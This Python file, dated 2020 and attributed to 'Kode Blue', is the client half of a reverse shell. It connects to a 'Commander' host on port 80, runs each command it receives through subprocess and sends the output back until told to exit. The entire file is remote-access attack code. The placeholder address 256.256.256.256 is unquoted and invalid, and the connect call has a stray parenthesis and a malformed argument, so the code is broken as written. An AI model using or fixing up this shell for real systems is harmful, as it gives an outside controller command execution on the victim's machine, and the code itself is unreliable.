# Kode Blue, 10/30/2020
# Client Side of a Reverse Shell
# ClientSideRS.py

import socket
import subprocess

SERVER_HOST = 256.256.256.256   # IP of Commander
SERVER_PORT = 80                # some Port that will be able to connect
BUFFER_SIZE = 1024

s = socket.socket()
s.connect(SERVER_HOST,SERVER_PORT))
message = s.recv(BUFFER_SIZE).decode()
print("Commander: ", message)

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

# close connection to commander
s.close()
